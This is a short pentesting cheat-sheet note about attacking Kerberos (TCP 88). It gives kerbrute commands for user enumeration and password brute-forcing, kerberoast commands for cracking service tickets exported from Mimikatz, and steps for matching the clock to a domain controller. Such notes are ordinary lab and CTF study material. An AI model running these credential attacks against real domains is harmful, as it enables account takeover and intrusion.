# TCP 88: Kerberos

> Kerberos is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner.  
>
>  -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Kerberos_(protocol))</cite>

## Related

[Active Directoy](bear://x-callback-url/open-note?id=5C9EC040-0001-45F1-852C-769DB3092467-524-00001FFA6E2A0DB1)
[TCP 389: LDAP](bear://x-callback-url/open-note?id=21D3D852-FB60-4125-BA88-A3E7637264CD-622-00000420E636375E)
[Impacket](bear://x-callback-url/open-note?id=8B82F3FA-7934-4517-98E9-ED74DD9C76EB-524-000018D307D11453)

## kerbrute

A tool to perform Kerberos pre-auth bruteforcing
[GitHub - ropnop/kerbrute](https://github.com/ropnop/kerbrute)

enumerate users
```bash
./kerbrute_linux_386 userenum -d <domain> --dc <domaincontroller> <usernames.txt>
```

bruteforce password of one user
```bash
./kerbrute_linux_386 bruteuser -d <domain> --dc <domaincontroller> <password-list> <username@domain>
```

## Kerberoast

Install
```bash
sudo apt install kerberoast
```

Use exported tickets from [Mimikatz](bear://x-callback-url/open-note?id=56BE74BE-2DCB-4F64-9CEE-AFE5BE6597BD-7113-00001201E35778D7)
```bash
python /usr/share/kerberoast/tgsrepcrack.py <wordlist> <exported-tickets-file>
```

## Sync time

It's necessary to sync the client time to the domain controller. 

**Error** (when not synced)
> SessionError: KRB_AP_ERR_SKEW(Clock skew too great)  

### ntpdate

```bash
ntpdate <dc-ip>
```

### manually

**Get server time**
```bash
nmap -sC -sV <ip>
```

```
Host script results:
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-03-20T00:14:12
|_  start_date: N/A
```

**Set local time accordingly**
```bash
date -s "20 Mar 2020 00:14:12+00:00"
```
